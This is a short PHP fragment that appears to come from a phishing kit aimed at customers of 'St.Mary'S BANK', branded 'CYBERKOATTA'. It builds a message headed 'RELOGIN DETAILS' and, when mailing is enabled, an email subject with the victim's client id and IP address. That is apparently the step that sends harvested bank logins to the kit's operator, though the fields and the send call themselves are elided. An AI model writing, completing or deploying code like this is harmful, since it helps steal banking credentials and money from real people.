...
$message = "[⚓️ CYBERKOATTA ⚓️ St.Mary'S BANK ⚓️ CLIENT :{$client} ⚓️]\n\n";
$message .= "********** [ 💻 2 RELOGIN DETAILS 💻 ] **********\n";
...
if ($settings['send_mail'] == "1"){
       ...
       $subject = "⚓️ CYBERKOATTA ⚓️ St.Mary'S BANK ⚓️ LOGIN ⚓️ CLIENT ⚓️ #{$client} ⚓️ {$IP}";
       $msg = $message;
